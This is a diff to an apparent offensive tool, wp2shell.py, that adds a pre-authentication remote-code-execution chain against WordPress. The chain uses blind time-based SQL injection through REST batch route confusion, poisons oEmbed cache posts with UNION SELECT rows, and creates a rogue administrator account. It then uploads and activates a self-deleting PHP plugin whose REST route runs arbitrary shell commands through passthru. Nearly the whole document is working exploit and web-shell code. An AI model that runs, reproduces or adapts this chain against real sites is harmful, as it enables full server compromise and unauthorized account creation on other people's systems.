@@ -16,15 +16,19 @@ Usage:
   python3 wp2shell.py http://target.com check --confirm-sqli
   python3 wp2shell.py http://target.com extract --fast  # fast X-WP-Total mode
   python3 wp2shell.py http://target.com extract --blind # blind binary search
-  python3 wp2shell.py http://target.com rce --outfile /var/www/html/x.php
+  python3 wp2shell.py http://target.com rce --escalate  # pre-auth RCE (no FILE, no password)
+  python3 wp2shell.py http://target.com rce --outfile --web-dir /var/www/html
   python3 wp2shell.py http://target.com rce --plugin --user admin --password pass
 """
 
 from __future__ import annotations
 
 import argparse
+import base64
 import concurrent.futures
 import copy
+import hashlib
+import html
 import http.cookiejar
 import io
 import json
@@ -211,6 +215,27 @@ class BatchClient:
             return inner_body["responses"][1]
         except (KeyError, IndexError, TypeError, ValueError, json.JSONDecodeError):
             return None
+
+    def raw_batch(self, requests: list, timeout: Optional[float] = None) -> bytes:
+        """Send raw batch request, return response bytes."""
+        req = urllib.request.Request(
+            self.endpoint,
+            data=json.dumps({"requests": requests}).encode(),
+            headers={"Content-Type": "application/json", "User-Agent": self.user_agent},
+            method="POST",
+        )
+        t = timeout or self.timeout
+        with self._opener.open(req, timeout=t) as resp:
+            return resp.read()
+
+    def get_raw(self, path: str, timeout: Optional[float] = None) -> bytes:
+        """Raw GET request, return bytes."""
+        url = self.base_url + (path if path.startswith("/") else f"/{path}")
+        req = urllib.request.Request(url, method="GET",
+                                     headers={"User-Agent": self.user_agent})
+        t = timeout or self.timeout
+        with self._opener.open(req, timeout=t) as resp:
+            return resp.read()
 
     # ── payload builders ────────────────────────────────────────────────
 
@@ -1184,9 +1209,573 @@ def cmd_extract(args: argparse.Namespace) -> int:
     return 0
 
 
+_ESCALATE_MARKER = "WP2SHELL_ESCALATE"
+
+
+def cmd_escalate(args: argparse.Namespace) -> int:
+    """Pre-auth RCE via oEmbed cache poisoning + admin creation chain.
+
+    No FILE privilege needed. No password cracking needed.
+    Creates new admin user via UNION SELECT post poisoning,
+    then uploads a self-deleting plugin for command execution.
+
+    Chain:
+      1. Confirm SQLi (timing oracle)
+      2. Extract posts table name
+      3. Extract admin user ID
+      4. Seed oEmbed posts via UNION SELECT
+      5. Recover cache post IDs
+      6. Poison posts → changeset + oEmbed trigger in same batch
+      7. Create new admin user
+      8. Login → upload plugin → exec command → cleanup
+    """
+    client = _make_client(args)
+    c = C(_TTY)
+    sleep_delay = args.sleep
+
+    # Step 1: Confirm SQLi and calibrate timing
+    info("Step 1/8: confirming SQLi and calibrating timing...")
+    threshold, retry_band = _calibrate_timing(client, sleep_delay)
+    if threshold is None:
+        bad("target not vulnerable (timing oracle failed)")
+        bad("batch route confusion may be patched or endpoint blocked")
+        return 1
+    good(f"SQLi confirmed — threshold={threshold:.3f}s, band={retry_band:.3f}s")
+
+    # Build timing-based condition checker
+    def is_true(condition: str) -> bool:
+        return _timing_oracle(client, condition, sleep_delay,
+                              threshold, retry_band)
+
+    def get_scalar(query: str, max_length: int) -> str:
+        return _blind_read_string(client, query, max_length,
+                                  sleep_delay, threshold, retry_band)
+
+    def get_int(query: str) -> int:
+        return _blind_read_int(client, query, sleep_delay,
+                               threshold, retry_band)
+
+    # Step 2: Extract posts table name
+    info("Step 2/8: extracting posts table name...")
+    posts_table = get_scalar(
+        "SELECT TABLE_NAME "
+        "FROM INFORMATION_SCHEMA.TABLES "
+        "WHERE TABLE_SCHEMA=DATABASE() "
+        "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
+        "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
+        64,
+    )
+    if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
+        bad(f"failed to extract posts table name (got {posts_table!r})")
+        return 1
+    table_prefix = posts_table[:-5]  # strip '_posts'
+    good(f"posts table: {posts_table}  (prefix: {table_prefix})")
+
+    # Step 3: Extract admin user ID
+    info("Step 3/8: finding admin user ID...")
+    admin_id = get_int(
+        f"SELECT u.ID FROM `{table_prefix}users` u "
+        f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
+        f"WHERE m.meta_key={_sql_hex(table_prefix + 'capabilities')} "
+        "AND INSTR(m.meta_value,"
+        + _sql_hex('s:13:"administrator";b:1;')
+        + ")>0 "
+        "ORDER BY u.ID LIMIT 1"
+    )
+    if admin_id < 1:
+        bad(f"failed to find admin user (got id={admin_id})")
+        return 1
+    good(f"admin user ID: {admin_id}")
+
+    # Step 4: Seed oEmbed cache posts
+    info("Step 4/8: seeding oEmbed cache posts...")
+    # Find a published post URL for oEmbed
+    raw = client.get_raw("/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
+                         timeout=15)
+    published = json.loads(raw)
+    if not published or not published[0].get("link"):
+        bad("no published posts found — oEmbed chain needs at least one public post")
+        return 1
+
+    token = secrets.token_hex(6)
+    public_post = urllib.parse.urlsplit(published[0]["link"])
+    embed_urls = [
+        urllib.parse.urlunsplit((
+            public_post.scheme, public_post.netloc,
+            public_post.path, public_post.query, f"{token}{i}",
+        ))
+        for i in range(3)
+    ]
+
+    seed_content = "".join(
+        f'[embed width="500" height="750"]{url}[/embed]' for url in embed_urls
+    )
+    seed_query = (
+        "1) AND 1=0 UNION ALL SELECT "
+        + _post_row(0, seed_content, "seed", "publish", "seed", 0, "post")
+        + " -- -"
+    )
+    _send_raw_inject(client, seed_query, "/wp/v2/widgets",
+                     per_page=-1, orderby="none", context="view",
+                     timeout=60)
+    good(f"seeded 3 oEmbed posts (token={token})")
+
+    # Step 5: Recover cache post IDs
+    info("Step 5/8: recovering cache post IDs via blind SQLi...")
+    embedsize = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
+    cache_post_ids = []
+    for i, embed_url in enumerate(embed_urls):
+        cache_key = hashlib.md5((embed_url + embedsize).encode()).hexdigest()
+        cid = get_int(
+            f"SELECT ID FROM `{posts_table}` "
+            "WHERE post_type=0x6f656d6265645f6361636865 "
+            f"AND post_name=0x{cache_key.encode().hex()} "
+            "ORDER BY ID DESC LIMIT 1"
+        )
+        if cid < 1:
+            bad(f"cache post {i} not found — oEmbed seeding failed")
+            return 1
+        cache_post_ids.append(cid)
+        info(f"  cache post {i}: ID={cid}")
+
+    if len(set(cache_post_ids)) != 3:
+        bad("cache post IDs not unique — oEmbed seeding corrupted")
+        return 1
+    good(f"3 cache posts recovered")
+
+    # Step 6-7: Poison posts + create admin in one batch
+    username = f"w2s_{token}"
+    password = f"W2s!{secrets.token_urlsafe(15)}"
+    email = f"{username}@wp2shell.local"
+    outer_loop_id = 1800000000 + secrets.randbelow(100000000)
+    nav_item_id = outer_loop_id + 1
+    inner_loop_id = outer_loop_id + 2
+
+    info("Step 6/8: poisoning post rows via UNION SELECT...")
+    changeset = json.dumps({
+        f"nav_menu_item[{nav_item_id}]": {
+            "value": {
+                "object_id": 0, "object": "", "menu_item_parent": 0,
+                "position": 0, "type": "custom", "title": "proof",
+                "url": "https://github.com/sergiointel/wp2shell-poc",
+                "target": "", "attr_title": "", "description": "proof",
+                "classes": "", "xfn": "", "status": "publish",
+                "nav_menu_term_id": 0, "_invalid": False,
+            },
+            "type": "nav_menu_item",
+            "user_id": admin_id,
+        }
+    }, separators=(",", ":"))
+
+    poisoned = [
+        _post_row(0,
+                  f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
+                  "trigger", "publish", "trigger", 0, "post"),
+        _post_row(cache_post_ids[0], changeset, "changeset", "future",
+                  str(uuid.uuid4()), outer_loop_id, "customize_changeset"),
+        _post_row(outer_loop_id, "outer", "outer", "draft", "outer",
+                  cache_post_ids[0], "post"),
+        _post_row(cache_post_ids[1], "", "cache", "publish", "cache",
+                  cache_post_ids[0], "post"),
+        _post_row(nav_item_id, "nav", "nav", "publish", "nav",
+                  cache_post_ids[2], "nav_menu_item"),
+        _post_row(cache_post_ids[2], "parse", "parse", "parse", "parse",
+                  inner_loop_id, "request"),
+        _post_row(inner_loop_id, "inner", "inner", "draft", "inner",
+                  cache_post_ids[2], "post"),
+    ]
+    escalation_query = (
+        "1) AND 1=0 UNION ALL SELECT "
+        + " UNION ALL SELECT ".join(poisoned)
+        + " -- -"
+    )
+
+    new_admin = {
+        "username": username,
+        "email": email,
+        "password": password,
+        "roles": ["administrator"],
+    }
+
+    info("Step 7/8: escalating to admin + creating user in one batch...")
+    inner = {
+        "requests": [
+            DESYNC_PRIMER,
+            {"method": "GET",
+             "path": "/wp/v2/widgets?" + urllib.parse.urlencode({
+                 "author_exclude": escalation_query,
+                 "per_page": -1, "orderby": "none", "context": "view",
+             })},
+            {"method": "GET", "path": "/wp/v2/posts"},
+            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
+            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
+        ]
+    }
+    batch_body = {
+        "requests": [
+            DESYNC_PRIMER,
+            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+    }
+    resp = client.post(batch_body, timeout=60)
+    if resp.status not in (200, 207):
+        bad(f"escalation batch failed (HTTP {resp.status})")
+        return 1
+    good(f"escalation batch sent (HTTP {resp.status})")
+
+    # Step 8: Login as new admin, upload plugin, exec command
+    info("Step 8/8: logging in and deploying command plugin...")
+    session = _AdminSession(client.base_url, timeout=client.timeout,
+                            insecure=getattr(args, "insecure", False),
+                            user_agent=client.user_agent)
+
+    if not session.login(username, password):
+        bad("login failed — escalation may not have stuck")
+        bad(f"tried user={username}")
+        return 1
+    good(f"authenticated as {username}")
+
+    # Deploy self-deleting command plugin
+    plugin_slug = f"w2s-escalate-{token}"
+    command_route = secrets.token_hex(12)
+    command_marker = secrets.token_hex(12)
+
+    plugin_php = f"""<?php
+/* Plugin Name: {plugin_slug} */
+add_action('rest_api_init', function () {{
+    register_rest_route('wp2shell/v1', '/{command_route}', array(
+        'methods' => 'POST',
+        'permission_callback' => '__return_true',
+        'callback' => function ($request) {{
+            ob_start();
+            passthru(base64_decode($request->get_param('c')) . ' 2>&1');
+            $output = ob_get_clean();
+            require_once ABSPATH . 'wp-admin/includes/plugin.php';
+            deactivate_plugins(plugin_basename(__FILE__), true);
+            @unlink(__FILE__);
+            return new WP_REST_Response(array(
+                'marker' => '{command_marker}',
+                'output' => $output,
+            ));
+        }},
+    ));
+}});
+""".encode()
+
+    info("uploading plugin...")
+    if not _deploy_plugin(session, plugin_slug, plugin_php):
+        bad("plugin upload failed")
+        return 1
+    good("plugin deployed")
+
+    # Run command
+    if not args.cmd:
+        args.cmd = "id && uname -a"
+    info(f"executing: {args.cmd}")
+    output = _run_plugin_command(client, command_route, command_marker, args.cmd)
+    if output is None:
+        bad("command execution failed")
+        return 1
+
+    good(f"new admin: {username}:{password}")
+    print(c._(c.G, output) if _TTY else output)
+    return 0
+
+
+def _calibrate_timing(client: BatchClient, sleep_delay: float
+                      ) -> Tuple[Optional[float], float]:
+    """Calibrate timing oracle: return (threshold, retry_band) or (None, 0)."""
+    for attempt in range(3):
+        fast_samples = []
+        slow_samples = []
+        for _ in range(5):
+            fast_samples.append(_probetime(client, "1=0", sleep_delay))
+        for _ in range(3):
+            slow_samples.append(_probetime(client, "1=1", sleep_delay))
+        fast = statistics.median(fast_samples)
+        slow = statistics.median(slow_samples)
+        jitter = statistics.median(abs(s - fast) for s in fast_samples)
+        if slow - fast > max(0.06, jitter * 8):
+            return (fast + slow) / 2, max(0.02, jitter * 3)
+        sleep_delay *= 2
+    return None, 0.0
+
+
+def _probetime(client: BatchClient, condition: str, sleep_delay: float) -> float:
+    """Time one SQL condition probe."""
+    payload = {
+        "requests": [
+            DESYNC_PRIMER,
+            {"method": "POST", "path": "/wp/v2/posts",
+             "body": {
+                 "requests": [
+                     DESYNC_PRIMER,
+                     {"method": "GET",
+                      "path": "/wp/v2/categories?" + urllib.parse.urlencode({
+                          "author_exclude":
+                              f"SELECT IF(({condition}),SLEEP({sleep_delay}),0)",
+                      })},
+                     {"method": "GET", "path": "/wp/v2/posts"},
+                 ]
+             }},
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+    }
+    start = time.perf_counter()
+    try:
+        client.post(payload, timeout=10)
+    except Exception:
+        pass
+    return time.perf_counter() - start
+
+
+def _timing_oracle(client: BatchClient, condition: str, sleep_delay: float,
+                   threshold: float, retry_band: float) -> bool:
+    """Single timing oracle query with retry in ambiguous cases."""
+    elapsed = _probetime(client, condition, sleep_delay)
+    if abs(elapsed - threshold) > retry_band:
+        return elapsed > threshold
+    return statistics.median([
+        elapsed,
+        _probetime(client, condition, sleep_delay),
+        _probetime(client, condition, sleep_delay),
+    ]) > threshold
+
+
+def _blind_read_string(client: BatchClient, query: str, max_length: int,
+                       sleep_delay: float, threshold: float,
+                       retry_band: float) -> str:
+    """Read string via blind binary search over timing oracle."""
+    expr = f"COALESCE(({query}),'')"
+
+    # Find length
+    lo, hi = 0, max_length
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        if _timing_oracle(client, f"CHAR_LENGTH({expr}) >= {mid}",
+                          sleep_delay, threshold, retry_band):
+            lo = mid
+        else:
+            hi = mid - 1
+    length = lo
+
+    result = []
+    for pos in range(1, length + 1):
+        lo, hi = 32, 126
+        while lo < hi:
+            mid = (lo + hi + 1) // 2
+            if _timing_oracle(
+                client,
+                f"ASCII(SUBSTRING({expr},{pos},1)) >= {mid}",
+                sleep_delay, threshold, retry_band,
+            ):
+                lo = mid
+            else:
+                hi = mid - 1
+        result.append(chr(lo))
+    return "".join(result)
+
+
+def _blind_read_int(client: BatchClient, query: str, sleep_delay: float,
+                    threshold: float, retry_band: float) -> int:
+    """Read integer via exponential expansion + binary search."""
+    expr = f"COALESCE(({query}),0)"
+    lo, hi = 0, 1
+    while _timing_oracle(client, f"{expr} >= {hi}",
+                         sleep_delay, threshold, retry_band):
+        lo, hi = hi, hi * 2
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        if _timing_oracle(client, f"{expr} >= {mid}",
+                          sleep_delay, threshold, retry_band):
+            lo = mid
+        else:
+            hi = mid - 1
+    return lo
+
+
+def _sql_hex(value: str) -> str:
+    """Return MySQL hex literal for a string."""
+    return f"0x{value.encode().hex()}" if value else "''"
+
+
+def _post_row(post_id: int, content: str, title: str, status: str,
+              name: str, parent: int, post_type: str) -> str:
+    """Build a single UNION SELECT row matching wp_posts column count (23 cols).
+
+    Columns: ID, post_author, post_date, post_date_gmt, post_content,
+    post_title, post_excerpt, post_status, comment_status, ping_status,
+    post_password, post_name, to_ping, pinged, post_modified,
+    post_modified_gmt, post_content_filtered, post_parent, guid,
+    menu_order, post_type, post_mime_type, comment_count
+    """
+    return ",".join((
+        str(post_id),           # ID
+        "1",                     # post_author
+        _sql_hex("2020-01-01 00:00:00"),  # post_date
+        _sql_hex("2020-01-01 00:00:00"),  # post_date_gmt
+        _sql_hex(content),       # post_content
+        _sql_hex(title),         # post_title
+        "''",                    # post_excerpt
+        _sql_hex(status),        # post_status
+        _sql_hex("closed"),      # comment_status
+        _sql_hex("closed"),      # ping_status
+        "''",                    # post_password
+        _sql_hex(name),          # post_name
+        "''",                    # to_ping
+        "''",                    # pinged
+        _sql_hex("2020-01-01 00:00:00"),  # post_modified
+        _sql_hex("2020-01-01 00:00:00"),  # post_modified_gmt
+        "''",                    # post_content_filtered
+        str(parent),             # post_parent
+        "''",                    # guid
+        "0",                     # menu_order
+        _sql_hex(post_type),     # post_type
+        "''",                    # post_mime_type
+        "0",                     # comment_count
+    ))
+
+
+def _send_raw_inject(client: BatchClient, sqli: str, route: str,
+                     timeout: int = 60, **params) -> None:
+    """Send one injection via double-confusion batch and ignore response."""
+    params["author_exclude"] = sqli
+    inner = {
+        "requests": [
+            DESYNC_PRIMER,
+            {"method": "GET",
+             "path": f"{route}?{urllib.parse.urlencode(params)}"},
+            {"method": "GET", "path": "/wp/v2/posts"},
+        ]
+    }
+    client.post({
+        "requests": [
+            DESYNC_PRIMER,
+            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
+            {"method": "POST", "path": "/batch/v1"},
+        ]
+    }, timeout=timeout)
+
+
+class _AdminSession:
+    """Minimal admin session for plugin upload — no webshell, just deploy+run."""
+
+    def __init__(self, base_url: str, *, timeout: float = 20,
+                 user_agent: str = "wp2shell/3.0", insecure: bool = False):
+        self.base_url = base_url.rstrip("/")
+        self.timeout = timeout
+        self._jar = http.cookiejar.CookieJar()
+        handlers = [urllib.request.HTTPCookieProcessor(self._jar)]
+        if insecure:
+            handlers.append(SSLContextHandler())
+        self._opener = urllib.request.build_opener(*handlers)
+        self._opener.addheaders = [("User-Agent", user_agent)]
+
+    def login(self, username: str, password: str) -> bool:
+        try:
+            self._open("/wp-login.php", timeout=15)
+            self._open("/wp-login.php",
+                       data=urllib.parse.urlencode({
+                           "log": username, "pwd": password,
+                           "wp-submit": "Log In",
+                           "redirect_to": f"{self.base_url}/wp-admin/",
+                           "testcookie": "1",
+                       }).encode(),
+                       headers={"Content-Type":
+                                "application/x-www-form-urlencoded"})
+            return any(c.name.startswith("wordpress_logged_in")
+                       for c in self._jar)
+        except Exception:
+            return False
+
+    def _open(self, path: str, data=None, headers=None,
+              timeout: Optional[float] = None) -> bytes:
+        req = urllib.request.Request(
+            self.base_url + path, data=data, headers=headers or {})
+        t = timeout or self.timeout
+        with self._opener.open(req, timeout=t) as resp:
+            return resp.read()
+
+
+def _deploy_plugin(session: _AdminSession, slug: str, php: bytes) -> bool:
+    """Upload and activate a plugin via admin panel."""
+    try:
+        # Get upload nonce
+        page = session._open("/wp-admin/plugin-install.php?tab=upload").decode(
+            "utf-8", "replace")
+        nonce = re.search(r'name="_wpnonce"[^>]*value="([0-9a-f]+)"', page)
+        if not nonce:
+            return False
+
+        # Build zip
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr(f"{slug}/{slug}.php", php)
+        zip_data = buf.getvalue()
+
+        # Upload — use string concat, not bytes join, to avoid encoding issues
+        boundary = "----w2s" + uuid.uuid4().hex
+        body_prefix = (
+            "--" + boundary + "\r\n"
+            'Content-Disposition: form-data; name="_wpnonce"\r\n\r\n'
+            + nonce.group(1) + "\r\n"
+            "--" + boundary + "\r\n"
+            'Content-Disposition: form-data; name="_wp_http_referer"\r\n\r\n'
+            "/wp-admin/plugin-install.php?tab=upload\r\n"
+            "--" + boundary + "\r\n"
+            'Content-Disposition: form-data; name="pluginzip"; filename="'
+            + slug + '.zip"\r\n'
+            "Content-Type: application/zip\r\n\r\n"
+        ).encode()
+        body_suffix = ("\r\n--" + boundary + "--\r\n").encode()
+        body = body_prefix + zip_data + body_suffix
+
+        result = session._open(
+            "/wp-admin/update.php?action=upload-plugin", data=body,
+            headers={"Content-Type":
+                     f"multipart/form-data; boundary={boundary}"},
+            timeout=60)
+
+        # Activate
+        page = result.decode("utf-8", "replace")
+        link = re.search(
+            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', page)
+        if not link:
+            return False
+        activate_path = html.unescape(link.group(1))
+        session._open("/wp-admin/" + activate_path if activate_path.startswith("plugins.php") else activate_path, timeout=30)
+        return True
+    except Exception:
+        return False
+
+
+def _run_plugin_command(client: BatchClient, route: str, marker: str,
+                        command: str) -> Optional[str]:
+    """Run command via deployed plugin REST endpoint (self-deleting)."""
+    try:
+        req = urllib.request.Request(
+            f"{client.base_url}/?rest_route=/wp2shell/v1/{route}",
+            data=json.dumps({
+                "c": base64.b64encode(command.encode()).decode(),
+            }).encode(),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with client._opener.open(req, timeout=60) as resp:
+            result = json.loads(resp.read())
+        if result.get("marker") != marker:
+            return None
+        return result.get("output", "")
+    except Exception:
+        return None
+
+
 def cmd_rce(args: argparse.Namespace) -> int:
     client = _make_client(args)
 
+    if args.escalate:
+        return cmd_escalate(args)
     if args.outfile:
         info("INTO OUTFILE RCE (requires MySQL FILE privilege)...")
         result = rce_outfile(client, outfile_dir=args.outfile_dir,
@@ -1395,6 +1984,8 @@ def build_parser() -> argparse.ArgumentParser:
     rce.add_argument("-i", "--interactive", action="store_true",
                      help="interactive shell")
     mode = rce.add_mutually_exclusive_group(required=True)
+    mode.add_argument("--escalate", action="store_true",
+                      help="pre-auth escalation RCE (no FILE priv, no password)")
     mode.add_argument("--outfile", action="store_true",
                       help="INTO OUTFILE RCE (needs FILE privilege)")
     mode.add_argument("--plugin", action="store_true",
@@ -1405,6 +1996,8 @@ def build_parser() -> argparse.ArgumentParser:
                      help="web-accessible counterpart (default: /rce)")
     rce.add_argument("--user", help="admin username (for --plugin)")
     rce.add_argument("--password", help="admin password (for --plugin)")
+    rce.add_argument("--sleep", type=float, default=0.4,
+                     help="SQL timing delay for --escalate (default: 0.4)")
     rce.add_argument("--cleanup", action="store_true",
                      help="remove webshell when done (plugin mode)")
     rce.set_defaults(func=cmd_rce)
